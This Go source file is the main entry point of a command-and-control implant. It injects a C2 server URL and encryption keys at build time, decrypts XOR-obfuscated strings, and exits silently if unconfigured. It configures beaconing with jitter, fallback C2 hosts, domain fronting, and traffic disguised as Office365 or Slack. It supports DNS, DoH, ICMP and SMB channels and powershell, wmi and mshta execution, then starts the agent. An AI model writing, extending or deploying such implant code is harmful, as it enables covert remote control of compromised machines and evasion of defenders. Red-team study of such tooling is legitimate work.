package main

import (
	"crypto/sha256"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/mjopsec/taburtuaiC2/pkg/profiles"
	"github.com/mjopsec/taburtuaiC2/pkg/strenc"
)

// Build-time variables — ALL injected via -ldflags. No defaults.
// An agent built without -X main.serverURL=... will exit silently (inoperable).
var (
	serverURL    = "" // -X main.serverURL=https://c2.example.com
	encKey       = "" // -X main.encKey=<32-char random key>
	secondaryKey = "" // -X main.secondaryKey=<32-char random key>

	// Encrypted variants — set by agent-win-encrypted Makefile target.
	serverURLEnc = ""
	encKeyEnc    = ""
	secKeyEnc    = ""
	xorKeyHex    = ""

	// Beacon timing
	defaultInterval = "30" // seconds
	defaultJitter   = "30" // percent (0-100)

	// OPSEC profile fields
	defaultMaxRetries        = "5"
	defaultKillDate          = ""      // YYYY-MM-DD; empty = never
	defaultWorkingHoursOnly  = "false"
	defaultWorkingHoursStart = "0"
	defaultWorkingHoursEnd   = "0"

	// Evasion flags
	defaultEnableEvasion     = "false"
	defaultSleepMasking      = "false"
	defaultUserAgentRotation = "false"

	// Execution method: direct | cmd | powershell | wmi | mshta
	defaultExecMethod = "cmd"

	// Malleable HTTP profile: default | office365 | cdn | jquery | slack | ocsp
	defaultProfile = "default"

	// Domain fronting
	defaultFrontDomain = ""

	// Alternative transport: http | ws | dns | doh | icmp | smb
	defaultTransport   = "http"
	defaultWSServerURL = ""
	defaultDNSDomain   = ""
	defaultDNSServer   = ""
	defaultDOHDomain   = ""
	defaultDOHProvider = "cloudflare"
	defaultSMBRelay    = ""
	defaultSMBPipe     = "svcctl"

	// Certificate pinning — SHA-256 hex fingerprint of server TLS leaf cert.
	defaultCertPin = ""

	// Fallback C2 URLs — comma-separated list tried in order when the primary
	// serverURL is unreachable.  Empty = no failover.
	defaultFallbackURLs = "" // -X main.defaultFallbackURLs=https://backup1.example.com,https://backup2.example.com

	// instanceSalt is a per-generated-binary random hex string so two implants
	// deployed on the same host receive distinct UUIDs.
	instanceSalt = "" // -X main.instanceSalt=<random 16-char hex>  — set by generator

	// Debug mode — set to "true" only for development builds
	debugMode = "false"
)

// init decrypts build-time-encrypted strings before main() runs.
func init() {
	if xorKeyHex == "" || serverURLEnc == "" {
		return
	}
	keyVal, err := strconv.ParseUint(xorKeyHex, 16, 8)
	if err != nil {
		return
	}
	key := byte(keyVal)
	if dec := strenc.Dec(serverURLEnc, key); dec != "" {
		serverURL = dec
	}
	if dec := strenc.Dec(encKeyEnc, key); dec != "" {
		encKey = dec
	}
	if dec := strenc.Dec(secKeyEnc, key); dec != "" {
		secondaryKey = dec
	}
}

func main() {
	// Guard: required build-time values must be injected via -ldflags.
	// A binary without a C2 URL is inoperable — exit silently (no output).
	if serverURL == "" || encKey == "" {
		os.Exit(0)
	}

	preinitConsole()

	interval, _ := strconv.Atoi(defaultInterval)
	if interval < 1 {
		interval = 30
	}

	jitterPct, _ := strconv.Atoi(defaultJitter)
	if jitterPct < 0 || jitterPct > 100 {
		jitterPct = 30
	}

	maxRetries, _ := strconv.Atoi(defaultMaxRetries)
	if maxRetries < 1 {
		maxRetries = 5
	}

	workStart, _ := strconv.Atoi(defaultWorkingHoursStart)
	workEnd, _ := strconv.Atoi(defaultWorkingHoursEnd)

	// Parse fallback URLs
	var fallbackURLs []string
	for _, u := range strings.Split(defaultFallbackURLs, ",") {
		u = strings.TrimSpace(u)
		if u != "" && u != serverURL {
			fallbackURLs = append(fallbackURLs, u)
		}
	}

	cfg := &AgentConfig{
		ServerURL:         serverURL,
		FallbackURLs:      fallbackURLs,
		PrimaryKey:        encKey,
		SecondaryKey:      secondaryKey,
		Interval:          interval,
		JitterPercent:     jitterPct,
		MaxRetries:        maxRetries,
		KillDate:          defaultKillDate,
		WorkingHoursOnly:  defaultWorkingHoursOnly == "true",
		WorkingHoursStart: workStart,
		WorkingHoursEnd:   workEnd,
		EnableEvasion:     defaultEnableEvasion == "true",
		SleepMasking:      defaultSleepMasking == "true",
		UserAgentRotation: defaultUserAgentRotation == "true",
		ExecMethod:        defaultExecMethod,
		Profile:           profiles.Get(defaultProfile),
		FrontDomain:       defaultFrontDomain,
		CertPin:           defaultCertPin,
		Transport:         defaultTransport,
		WSServerURL:       defaultWSServerURL,
		DNSDomain:         defaultDNSDomain,
		DNSServer:         defaultDNSServer,
		DOHDomain:         defaultDOHDomain,
		DOHProvider:       defaultDOHProvider,
		SMBRelay:          defaultSMBRelay,
		SMBPipe:           defaultSMBPipe,
	}

	agent, err := NewAgent(cfg)
	if err != nil {
		dbgf("[!] Failed to create agent: %v\n", err)
		pauseIfDebug()
		os.Exit(1)
	}

	if err := agent.Start(); err != nil {
		dbgf("[!] Agent failed: %v\n", err)
		pauseIfDebug()
		os.Exit(1)
	}
	pauseIfDebug()
}

// pauseIfDebug waits for Enter before exiting when debugMode == "true"
func pauseIfDebug() {
	if debugMode == "true" {
		dbgf("\n[DEBUG] Press Enter to exit...")
		var s string
		_, _ = os.Stdin.Read([]byte(s))
	}
}

// generateUUID returns a stable v4-format UUID.
// instanceSalt (baked in at build time) ensures two different implant binaries
// on the same host produce distinct IDs without requiring persistent storage.
func generateUUID() string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	seed := hostname + "|" + username + "|" + serverURL + "|" + instanceSalt
	h := sha256.Sum256([]byte(seed))
	b := h[:16]
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}


